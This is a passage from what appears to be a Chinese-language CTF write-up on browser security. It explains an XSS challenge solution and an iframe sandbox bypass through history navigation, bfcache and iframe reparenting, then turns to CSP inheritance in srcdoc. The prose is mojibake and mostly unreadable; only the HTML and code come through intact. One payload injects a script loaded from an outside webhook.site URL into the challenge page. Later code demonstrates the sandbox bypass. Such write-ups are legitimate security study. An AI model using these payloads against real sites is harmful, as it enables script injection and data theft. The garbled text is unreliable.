openerï¼Œè¡¨é¢ä¸Šçœ‹èµ·ä¾†è·Ÿé–‹å•Ÿå¾Œçš„ window è„«ç¯€äº†ï¼Œä½†å…¶å¯¦åˆ©ç”¨ name å±¬æ€§å°±èƒ½å¤ å†æ¬¡å­˜å–åˆ°å®ƒï¼Œé€™é»æˆ‘ä»¥å‰æœ‰å¯«éï¼š<a href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/#windowopen">iframe èˆ‡ window.open é»‘é­”æ³•</a>ã€‚</p><p>è§£æ±ºäº† opener çš„å•é¡Œä»¥å¾Œï¼Œå°±å¯ä»¥ä¾†çœ‹å¦ä¸€å€‹æœ€éº»ç…©çš„åœ°æ–¹ï¼Œå°±æ˜¯é‚£ä¸€æ®µ scriptï¼Œå¦‚æœèƒ½è®“å®ƒä¸åŸ·è¡Œï¼Œé‚£å¾ˆè¼•é¬†å°±èƒ½åšåˆ° XSSã€‚ä½†è¦æ€éº¼è®“å®ƒä¸åŸ·è¡Œå‘¢ï¼Ÿä»¥å‰æœ‰<a href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp">å¯«é</a> iframe ä¸Šæœ‰å€‹å±¬æ€§å«åš cspï¼ŒåŠ ä¸Šå®ƒä¹‹å¾Œå°±å¯ä»¥è¨­ç½® CSPã€‚</p><p>å¦‚åŒå‰é¢æ‰€èªªçš„ï¼Œå› ç‚º same-site cookieï¼Œå› æ­¤è¦ç›´æ¥åˆ©ç”¨é¡Œç›®çš„ memo åŠŸèƒ½åµŒå…¥ï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼ˆä¿®æ”¹è‡ª Jazzy åœ¨ Discord ä¸­æä¾›çš„ payloadï¼‰ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>  <span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    w<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> html <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    html    &lt;script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1">&lt;\/script>    &lt;iframe csp="script-src http: https:" src="/">&lt;/iframe>  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'main'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨ CSP ä¸è®“ inline script åŸ·è¡Œï¼Œç„¶å¾Œå†è¼‰å…¥ä¸€æ¬¡ç¶²é ï¼Œå°±æœƒåŸ·è¡ŒåŸæœ¬æº–å‚™å¥½çš„ scriptã€‚ä¸éæˆ‘å¯¦éš›è©¦äº†ä¸€ä¸‹ï¼Œç¾åœ¨æœ€æ–°ç‰ˆæœƒæœ‰éŒ¯èª¤ï¼š</p><blockquote><p>Refused to display â€˜<a href="http://localhost:1337/">http://localhost:1337/</a>â€˜ in a frame. The embedder requires it to enforce the following Content Security Policy: â€˜script-src http: https:â€™. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.</p></blockquote><p>å¦‚æœé é¢åŸæœ¬æ²’æœ‰ csp çš„è©±ï¼Œæ˜¯æ²’è¾¦æ³•ç¡¬è¦åŠ ä¸Šå»çš„ã€‚å¾è³½å¾Œè¨è«–çœ‹èµ·ä¾†æ¯”è¼ƒèˆŠç‰ˆçš„ Chrome å°æ–¼ same-origin çš„ csp ä¼¼ä¹é™åˆ¶æ²’é€™éº¼åš´æ ¼ï¼Œå› æ­¤åªæœ‰åœ¨èˆŠç‰ˆå¯ä»¥ï¼ˆä¸éæˆ‘ä¹Ÿä¸ç¢ºå®šå°±æ˜¯äº†ï¼Œæˆ‘æ‡¶å¾—æ‰¾èˆŠç‰ˆä¾†è©¦äº†ï¼‰ã€‚</p><p>æ¥è‘—è¬›ä¸€ä¸‹é æœŸè§£ï¼Œé æœŸè§£ç‰½æ¶‰åˆ°äº†å¾ˆå¤š iframe ç›¸é—œçš„çŸ¥è­˜ï¼Œæˆ‘é™¸çºŒèŠ±äº†å¤§æ¦‚ä¸€é€±æ‰çœŸçš„ç†è§£åˆ°åº•é æœŸè§£ç‚ºä»€éº¼å¯ä»¥ workï¼Œç‚ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘æŠŠå®ƒæ‹†æˆå¹¾å€‹å°éƒ¨åˆ†ï¼Œé †è‘—çœ‹å®Œæ‡‰è©²å°±å¯ä»¥ç†è§£æœ€å¾Œçš„é æœŸè§£äº†ã€‚</p><h3><span id="1-iframe-çš„-navigation">1. iframe çš„ navigation</span></h3><p>ç”±æ–¼ iframe æ˜¯ä¸€å€‹ç¨ç«‹çš„ windowï¼Œå› æ­¤ iframe æœ¬èº«ç•¶ç„¶ä¹Ÿå¯ä»¥åš navigationï¼Œå°å»å…¶ä»–çš„åœ°æ–¹ã€‚å‡è¨­åœ¨ç¶²é ä¸Šæœ‰ä¸€å€‹ iframeï¼ŒåŸæœ¬çš„ src æ˜¯ Aï¼Œæ¥è‘—ä½ æŠŠ src æ”¹æˆ Bï¼Œæ­¤æ™‚å¦‚æœæŒ‰ä¸‹ä¸Šä¸€é ï¼ˆæˆ–æ˜¯åŸ·è¡Œ <code>history.back()</code>ï¼‰ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…å‘¢ï¼Ÿæœ‰å…©å€‹å¯èƒ½æ€§ï¼š</p><ol><li>æ•´å€‹ç¶²é ï¼ˆtop levelï¼‰å›åˆ°ä¸Šä¸€é </li><li>iframe å›åˆ°ä¸Šä¸€é ï¼ˆå¾ B å›åˆ° Aï¼‰</li></ol><p>ç­”æ¡ˆæ˜¯ 2ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œç•¶ä½ åœ¨åš navigation çš„æ™‚å€™ï¼Œiframe çš„ç´€éŒ„ä¹Ÿæœƒè¢«åŠ é€²æ•´é«”çš„ history è£¡é¢ã€‚</p><p>çŸ¥é“é€™å€‹å‰æä¹‹å¾Œï¼Œå°±å¯ä»¥ä¾†çœ‹ä¸€å€‹ç‹€æ³ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    f<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>å…ˆæŠŠ iframe è¼‰å…¥ test1ï¼Œä¸¦ä¸”åŠ ä¸Š sandboxï¼Œå› æ­¤ script ä¸æœƒåŸ·è¡Œ</li><li>æŒ‰ä¸‹ loadTest2 æŒ‰éˆ•ï¼ŒæŠŠ iframe sandbox æ‹¿æ‰ï¼Œå°å» test2ï¼Œå› æ­¤ script æœƒåŸ·è¡Œ</li></ol><p>æ­¤æ™‚å¦‚æœæŒ‰ä¸‹ back æŒ‰éˆ•ï¼Œç†æ‰€ç•¶ç„¶çš„ iframe æœƒå›åˆ° test1ï¼Œä½†æ˜¯ sandbox å¯èƒ½æœƒæœ‰å…©ç¨®ç‹€æ³ï¼š</p><ol><li>sandbox ä¹Ÿä¸€èµ·å›åˆ°è¼‰å…¥ test1 æ™‚çš„ç‹€æ³</li><li>sandbox ç¶­æŒç¾åœ¨çš„å±¬æ€§ï¼Œä¹Ÿå°±æ˜¯æ²’æœ‰ sandbox</li></ol><p>ç­”æ¡ˆæœƒæ˜¯ 2ï¼Œsandbox çš„å±¬æ€§ä¸æœƒè®Šï¼Œå› æ­¤æŒ‰ä¸‹ back ä¹‹å¾Œï¼Œsandbox æ²’äº†ï¼Œtest1 çš„ script ç¾åœ¨å°±å¯ä»¥åŸ·è¡Œäº†ã€‚</p><p>å…¶å¯¦æ„Ÿè¦ºä¹Ÿæ»¿åˆç†çš„ï¼Œç•¢ç«Ÿä½ åªæ˜¯æ”¹å‹• src è€Œå·²ï¼Œæ²’æœ‰å‹• sandboxï¼Œå› æ­¤ sandbox ç¶­æŒåœ¨æœ€æ–°çš„ç‹€æ…‹ã€‚</p><h3><span id="2-iframe-reparenting-èˆ‡-bfcache">2. iframe reparenting èˆ‡ bfcache</span></h3><p>å‰›å‰›çš„ç‹€æ³æ˜¯æ›´æ”¹ sandbox ä¸¦ä¸”è¼‰å…¥æ–°çš„ src ä¹‹å¾Œï¼Œå›åˆ°ä¸Šä¸€é ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘å†ä¾†çœ‹å¦ä¸€å€‹ç‹€æ³ï¼Œå‰åŠæ®µç›¸åŒï¼Œä½†è¼‰å…¥æ–°çš„ src ä¹‹å¾Œï¼Œæˆ‘å€‘ä¸ç›´æ¥å›åˆ°ä¸Šä¸€é ï¼Œè€Œæ˜¯å…ˆæŠŠæ•´å€‹ç¶²é è·³è½‰åˆ°å…¶ä»–é é¢ï¼Œæ¥è‘—æ‰å›å»ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">location <span class="token operator">=</span> <span class="token string">'a.html'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    f<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¸¬è©¦æµç¨‹æ˜¯ï¼š</p><ol><li>ç­‰å¾… iframe è¼‰å…¥å®Œç•¢ï¼Œæœƒåœ¨ç•«é¢ä¸Šçœ‹åˆ° test1ï¼Œæ­¤æ™‚å› ç‚ºæœ‰ sandboxï¼Œæ‰€ä»¥ script ä¸æœƒåŸ·è¡Œ</li><li>æŒ‰ä¸‹ load test2 æŒ‰éˆ•ï¼ŒæŠŠ sandbox ç§»é™¤ï¼Œè¼‰å…¥ test2ï¼Œscript è¢«åŸ·è¡Œ</li><li>æŒ‰ä¸‹ top level navigationï¼ŒæŠŠç¶²é è·³å»å…¶ä»–åœ°æ–¹</li><li>æŒ‰ä¸‹ç€è¦½å™¨ä¸Šçš„ä¸Šä¸€é </li></ol><p>é‚£æŒ‰å®Œä¸Šä¸€é ä¹‹å¾Œï¼Œé æœŸç‹€æ³æœƒæ˜¯ä»€éº¼ï¼Ÿæœƒæ ¹æ“šæœ‰æ²’æœ‰ bfcacheï¼Œå‡ºç¾å…©ç¨®çµæœï¼Œå…ˆçœ‹æœ‰ bfcache çš„ã€‚</p><p>å¦‚æœæœ‰ bfcache çš„è©±ï¼ŒæŒ‰å®Œä¸Šä¸€é å°±æœƒæ˜¯å‰›å‰›ä¸€æ¨£çš„ç‹€æ…‹ï¼Œå¯ä»¥è§€å¯Ÿåˆ°ï¼š</p><ol><li>console æ²’æœ‰å‡ºç¾ runï¼Œä»£è¡¨ script ä¸æœƒé‡æ–°è¢«åŸ·è¡Œ</li><li>iframe çš„ src æ˜¯ test2</li><li>test2 çš„éš¨æ©Ÿæ•¸è·Ÿå‰›å‰›ä¸€æ¨£ï¼Œä»£è¡¨ iframe ä¸­çš„ script ä¹Ÿæ²’æœ‰é‡æ–°è¢«åŸ·è¡Œ</li></ol><p>ç•¢ç«Ÿå«åš bfcache å˜›ï¼Œæ‰€ä»¥æœƒå®Œæ•´ä¿ç•™å‰›å‰›çš„ç‹€æ…‹ï¼Œä¸æœƒé‡æ–°è¼‰å…¥ä¸€æ¬¡ç¶²é ã€‚</p><p>é‚£å¦‚æœæ²’æœ‰ bfcache å‘¢ï¼Ÿç…§ç†ä¾†èªªç¶²é æ‡‰è©²è¦é‡æ–°è¼‰å…¥ä¸€æ¬¡æ‰å°ï¼Œæ‰€ä»¥é æœŸçš„ç‹€æ³æœƒæ˜¯æœ€å‰›é–‹å§‹çš„æ¨£å­ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯ä¸€å€‹ sandbox çš„ iframe è¼‰å…¥ test1ã€‚</p><p>ä½†å¦‚æœå¯¦éš›æŒ‰ä¸‹ä¸Šä¸€é ï¼Œæœƒç™¼ç¾çµæœæ˜¯æ—¢ä¸æ˜¯ä¸€é–‹å§‹çš„ sandbox + test1ï¼Œä¹Ÿä¸æ˜¯å‰›æ‰çš„ no sandbox + test2ï¼Œè€Œæ˜¯å…©è€…çš„æ··åˆé«”ï¼šsandbox + test2ã€‚</p><p>æ›å¥è©±èªªï¼Œsandbox å±¬æ€§ç¶­æŒäº†é é¢æœ€æ–°çš„ç‹€æ…‹ï¼Œæ˜¯æœ‰çš„ï¼Œä½†æ˜¯ iframe çš„ src å»ä¸æ˜¯æœ€æ–°çš„ï¼Œè€Œæ˜¯ç•™åœ¨æ­·å²ç´€éŒ„è£¡çš„ test2ï¼Œå…©è€…çµåˆèµ·ä¾†ï¼Œå°±è®Šæˆäº† sandbox çš„ test2ã€‚</p><p>é€™å€‹ã€Œå›åˆ°ä¸Šä¸€é æ™‚ï¼Œiframe çš„ src å›åˆ°ä¸Šæ¬¡çš„å…§å®¹ã€çš„æ©Ÿåˆ¶ï¼Œå°±å«åš iframe reparentingï¼Œä¼¼ä¹æ²’æœ‰å°æ‡‰çš„ spec å®Œæ•´æè¿°ï¼Œè€Œä¸”å„å€‹ç€è¦½å™¨çš„å¯¦ä½œä¹Ÿéƒ½ä¸å¤ªä¸€æ¨£ã€‚</p><p>é€™å€‹è¡Œç‚ºå¤§æ¦‚å°±æ˜¯ï¼šã€Œæˆ‘æ­·å²ç´€éŒ„è£¡æœ‰å€‹è¢« iframe è¼‰å…¥çš„ pageï¼Œç¾åœ¨ä½ æŒ‰äº†ä¸Šä¸€é ï¼Œç‚ºäº†å¢é€²ä½¿ç”¨è€…é«”é©—ï¼Œæˆ‘è¦æŠŠé€™å€‹ page ç›´æ¥æ”¾å›åˆ° iframe ä¸­ã€ï¼Œä½†å¼”è©­çš„æ˜¯å±¬æ€§å»ä¸æ˜¯æ²¿ç”¨ä¸Šæ¬¡çš„ï¼Œè€Œæ˜¯ç›´æ¥ç”¨äº†ç•¶å‰é é¢çš„ã€‚</p><p>å¦‚æœæˆ‘å€‘æŠŠæµç¨‹åéä¾†åšï¼Œå°±æ˜¯ä¸€ç¨® iframe çš„ sandbox bypassï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">location <span class="token operator">=</span> <span class="token string">'a.html'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    f<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘å€‘å…ˆè¼‰å…¥äº†å®‰å…¨çš„ test1ï¼Œä¸¦ä¸”æ²’æœ‰ sandbox å±¬æ€§ï¼Œæ¥è‘—æˆ‘å€‘æƒ³è¼‰å…¥é‚ªæƒ¡çš„ test2ï¼Œå› æ­¤åŠ ä¸Šäº† sandbox å±¬æ€§ï¼Œè¦ºå¾—é€™æ¨£å°±æ²’å•é¡Œäº†ã€‚</p><p>ä½†æ®Šä¸çŸ¥å¦‚æœä½ æŠŠç¶²é å°å»å…¶ä»–åœ°æ–¹ï¼Œå›åˆ°ä¸Šä¸€é ä¹‹å¾Œï¼Œå°±æœƒå‡ºç¾æ²’æœ‰ sandbox çš„ test2ã€‚</p><p>ç¸½è€Œè¨€ä¹‹å‘¢ï¼Œè¦è¨˜ä½çš„æ˜¯ï¼Œç•¶ä½ å›åˆ°ä¸Šä¸€é æ™‚ï¼š</p><ol><li>sandbox å±¬æ€§æ°¸é è·Ÿè‘—æœ€æ–°çš„é é¢</li><li>src æœƒæ˜¯ä¸Šä¸€æ¬¡æœ€å¾Œè¼‰å…¥çš„ç¶²é </li></ol><h3><span id="3-csp-çš„ç¹¼æ‰¿">3. CSP çš„ç¹¼æ‰¿</span></h3><p>å¦‚æœæ˜¯ç”¨ iframe src çš„è©±ï¼Œç”±æ–¼å°±æ˜¯åµŒå…¥äº†å¦ä¸€å€‹ç¨ç«‹çš„ç¶²é ï¼Œå› æ­¤å…©å€‹ç¶²é ä¹‹é–“çš„ CSP æ²’æœ‰ä»»ä½•é—œè¯ï¼Œä¸æœƒäº’ç›¸å½±éŸ¿ã€‚ä½†å¦‚æœæ˜¯ç”¨ srcdoc çš„è©±ï¼Œå°±æœ‰ç¹¼æ‰¿é—œä¿‚äº†ã€‚</p><p>ä»¥åº•ä¸‹çš„ç¨‹å¼ç¢¼ç‚ºä¾‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Test:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±æ–¼æœ‰è‘— <code>script-src &#39;none&#39;</code> çš„ CSPï¼Œå› æ­¤é é¢ä¸Šçš„ script ä¸æœƒåŸ·è¡Œï¼Œç„¶å¾Œ srcdoc è£¡çš„ script ä¹Ÿä¸æœƒåŸ·è¡Œï¼Œå› ç‚ºé€šå¸¸ iframe srcdoc çš„ CSP æœƒç¹¼æ‰¿å®ƒçš„ parentï¼Œè½èµ·ä¾†ä¹Ÿå¾ˆåˆç†ã€‚</p><p>é‚£æ¥ä¸‹ä¾†æˆ‘å€‘ä¾†è©¦è·Ÿå‰›å‰›é¡ä¼¼çš„äº‹æƒ…ï¼š</p><ol><li>ç¢ºèªé é¢ä¸Šæœ‰ CSP</li><li>ç¢ºèª srcdoc çš„ script ç„¡æ³•åŸ·è¡Œ</li><li>æŒ‰ä¸‹ top level navigationï¼Œå»åˆ°åˆ¥çš„é é¢</li><li>æ›´æ–°æª”æ¡ˆï¼ŒæŠŠ head è£¡çš„ CSP åˆªæ‰ï¼ˆä½ è¦è‡ªå·±æ‰‹å‹•åšï¼‰</li><li>æŒ‰ä¸‹ä¸Šä¸€é </li></ol><p>ä¸€æ¨£å‡è¨­åœ¨æ²’æœ‰ bfcache çš„ç‹€æ³ä¸‹ï¼Œç•¶æˆ‘åˆå›åˆ°é€™å€‹ç¶²é æ™‚ï¼Œæœƒæ˜¯ä»€éº¼ç‹€æ³ï¼Ÿé æœŸä¸­çš„è¡Œç‚ºæ‡‰è©²æ˜¯ï¼šã€Œå°±è·Ÿç¬¬ä¸€æ¬¡è¼‰å…¥ä¸€æ¨£ã€ï¼Œå› æ­¤é é¢ä¸Šçš„ script è·Ÿ srcdoc è£¡çš„ script éƒ½æ²’æœ‰ CSPï¼Œéƒ½å¯ä»¥åŸ·è¡Œç¨‹å¼ç¢¼ã€‚</p><p>ä½†ç­”æ¡ˆæ˜¯ï¼š</p><ol><li>é é¢ä¸Šç¢ºå¯¦æ²’æœ‰ CSPï¼Œæ‰€ä»¥ script å¯ä»¥åŸ·è¡Œï¼Œæœ‰å°å‡º run</li><li>ä½†æ˜¯ srcdoc çš„ script å»è¢« CSP æ“‹ä½äº†ï¼Œç„¡æ³•åŸ·è¡Œ</li></ol><p>ä¹Ÿå°±æ˜¯èªªï¼Œæ­¤æ™‚ iframe srcdoc çš„ CSP ä¸¦ä¸æ˜¯ç¹¼æ‰¿æ–¼ç•¶å‰é 